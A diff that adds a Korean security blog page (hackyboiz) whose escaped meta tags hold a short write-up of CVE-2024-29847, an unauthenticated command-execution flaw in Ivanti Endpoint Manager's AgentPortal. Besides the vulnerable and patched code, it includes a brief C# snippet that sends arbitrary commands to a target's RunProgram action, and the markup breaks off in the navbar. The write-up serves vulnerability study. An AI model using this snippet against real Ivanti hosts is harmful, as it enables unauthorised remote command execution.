@@ -1,0 +1,823 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29847-deep-dive-ivanti-endpoint-manager-agentportal-deserialization-of-untrusted-data-remote-code-execution-vulnerability/&#34;&gt;CVE-2024-29847 Deep Dive: Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Ivanti EPM before 2022 SU6&lt;/li&gt;
+&lt;li&gt;Ivanti EPM the 2024 September update&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;AgentPortal.exe&amp;#xC5D0;&amp;#xB294; .Net Remoting&amp;#xC744; &amp;#xAD6C;&amp;#xD604;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; IAngentProtal &amp;#xC778;&amp;#xD130;&amp;#xD398;&amp;#xC774;&amp;#xC2A4;&amp;#xAC00; &amp;#xC815;&amp;#xC758;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. IAgentPortal&amp;#xC5D0; RunProgram &amp;#xC635;&amp;#xC158;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574; &amp;#xBCF4;&amp;#xBA74; &amp;#xC6D0;&amp;#xACA9;&amp;#xC5D0;&amp;#xC11C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xADF8;&amp;#xB300;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ProcessRunProgramAction&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;TaskData td, TaskData tdRef, &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;[] data&lt;/span&gt;)&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+	&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; flag = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; index = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; command &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; td._commands)
+	{
+		&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+			Process process = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Process();
+			process.StartInfo.UseShellExecute = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+			process.StartInfo.RedirextStadardOutput = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+			process.StartInfo.FileName = td._target;
+			process.StartInfo.Arguments = command; &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+			process.Start(); &lt;span class=&#34;hljs-comment&#34;&gt;// [2]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC; [1]&amp;#xC5D0;&amp;#xC11C; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640; [2]&amp;#xC5D0;&amp;#xC11C; &amp;#xADF8;&amp;#xB300;&amp;#xB85C; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xB54C; command&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC544;&amp;#xBB34;&amp;#xB7F0;&amp;#xAC80;&amp;#xC99D;&amp;#xC744; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ProcessRunProgramAction&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;TaskData td, TaskData tdRef, &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;[] data&lt;/span&gt;)&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+	&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; flag = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; index = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; command &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; td._commands)
+	{
+		&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+			Process process = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Process();
+			process.StartInfo.UseShellExecute = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+			process.StartInfo.RedirextStadardOutput = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+			&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (td._target != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ping.exe&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; td._target != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tracert.exe&amp;quot;&lt;/span&gt;)
+				&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+			process.StartInfo.FileName = td._target;
+			process.StartInfo.Arguments = command;
+			process.Start();&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; ping&amp;#xC774;&amp;#xB098; tracert&amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB3C4;&amp;#xB85D; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; ip = args[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; port = args[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; command = args[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
+&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; arguments = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (args.Length &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;)
+{
+   arguments = &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;.Join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;, args, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, args.Length - &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;);
+}
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; url = String.Format(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tcp://{0}:{1}/LANDeskAgentPortal/LDSM&amp;quot;&lt;/span&gt;, ip, port);
+IAgentPortal agentPortal = (IAgentPortal)Activator.GetObject(&lt;span class=&#34;hljs-keyword&#34;&gt;typeof&lt;/span&gt;(IAgentPortal), url);
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;
+{
+    Console.WriteLine(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Sending request.&amp;quot;&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; request_result = agentPortal.Request(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, IAgentPortalBase.ActionEnum.RunProgram, command,  arguments);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xB9CC;&amp;#xD07C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xB3C4; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E8;&amp;#xC21C;&amp;#xD558;&amp;#xAC8C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xB123;&amp;#xC5B4; Agetnportal&amp;#xC5D0; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xBA74; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xC27D;&amp;#xACE0; &amp;#xC778;&amp;#xC99D;&amp;#xC744; &amp;#xAC70;&amp;#xCE58;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; CVSS3.1 9.8&amp;#xC810;&amp;#xC744; &amp;#xBC1B;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/horizon3ai/CVE-2024-29847&#34;&gt;horizon3ai/CVE-2024-29847&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/advisories/ZDI-24-1223/&#34;&gt;Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[하루한줄] CVE-2024-29847 : Ivanti Endpoint Manager (EPM)의 데이터 검증 미흡으로 인한 Unauthenticated Command Execution 취약점 - hackyboiz">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29847-deep-dive-ivanti-endpoint-manager-agentportal-deserialization-of-untrusted-data-remote-code-execution-vulnerability/&#34;&gt;CVE-2024-29847 Deep Dive: Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Ivanti EPM before 2022 SU6&lt;/li&gt;
+&lt;li&gt;Ivanti EPM the 2024 September update&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;AgentPortal.exe&amp;#xC5D0;&amp;#xB294; .Net Remoting&amp;#xC744; &amp;#xAD6C;&amp;#xD604;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; IAngentProtal &amp;#xC778;&amp;#xD130;&amp;#xD398;&amp;#xC774;&amp;#xC2A4;&amp;#xAC00; &amp;#xC815;&amp;#xC758;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. IAgentPortal&amp;#xC5D0; RunProgram &amp;#xC635;&amp;#xC158;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574; &amp;#xBCF4;&amp;#xBA74; &amp;#xC6D0;&amp;#xACA9;&amp;#xC5D0;&amp;#xC11C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xADF8;&amp;#xB300;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ProcessRunProgramAction&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;TaskData td, TaskData tdRef, &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;[] data&lt;/span&gt;)&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+	&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; flag = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; index = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; command &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; td._commands)
+	{
+		&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+			Process process = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Process();
+			process.StartInfo.UseShellExecute = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+			process.StartInfo.RedirextStadardOutput = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+			process.StartInfo.FileName = td._target;
+			process.StartInfo.Arguments = command; &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+			process.Start(); &lt;span class=&#34;hljs-comment&#34;&gt;// [2]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC; [1]&amp;#xC5D0;&amp;#xC11C; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640; [2]&amp;#xC5D0;&amp;#xC11C; &amp;#xADF8;&amp;#xB300;&amp;#xB85C; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xB54C; command&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC544;&amp;#xBB34;&amp;#xB7F0;&amp;#xAC80;&amp;#xC99D;&amp;#xC744; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ProcessRunProgramAction&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;TaskData td, TaskData tdRef, &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;[] data&lt;/span&gt;)&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+	&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; flag = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; index = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+	&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; command &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; td._commands)
+	{
+		&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+			Process process = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Process();
+			process.StartInfo.UseShellExecute = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+			process.StartInfo.RedirextStadardOutput = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;
+			&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (td._target != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ping.exe&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; td._target != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tracert.exe&amp;quot;&lt;/span&gt;)
+				&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+			process.StartInfo.FileName = td._target;
+			process.StartInfo.Arguments = command;
+			process.Start();&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; ping&amp;#xC774;&amp;#xB098; tracert&amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB3C4;&amp;#xB85D; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; ip = args[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; port = args[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; command = args[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
+&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; arguments = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (args.Length &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;)
+{
+   arguments = &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;.Join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;, args, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, args.Length - &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;);
+}
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt; url = String.Format(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tcp://{0}:{1}/LANDeskAgentPortal/LDSM&amp;quot;&lt;/span&gt;, ip, port);
+IAgentPortal agentPortal = (IAgentPortal)Activator.GetObject(&lt;span class=&#34;hljs-keyword&#34;&gt;typeof&lt;/span&gt;(IAgentPortal), url);
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;
+{
+    Console.WriteLine(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Sending request.&amp;quot;&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; request_result = agentPortal.Request(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, IAgentPortalBase.ActionEnum.RunProgram, command,  arguments);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xB9CC;&amp;#xD07C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xB3C4; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E8;&amp;#xC21C;&amp;#xD558;&amp;#xAC8C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xB123;&amp;#xC5B4; Agetnportal&amp;#xC5D0; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xBA74; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xAE30; &amp;#xC27D;&amp;#xACE0; &amp;#xC778;&amp;#xC99D;&amp;#xC744; &amp;#xAC70;&amp;#xCE58;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; CVSS3.1 9.8&amp;#xC810;&amp;#xC744; &amp;#xBC1B;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/horizon3ai/CVE-2024-29847&#34;&gt;horizon3ai/CVE-2024-29847&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/advisories/ZDI-24-1223/&#34;&gt;Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/">
+
+  <title>[하루한줄] CVE-2024-29847 : Ivanti Endpoint Manager (EPM)의 데이터 검증 미흡으로 인한 Unauthenticated Command Execution 취약점 - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
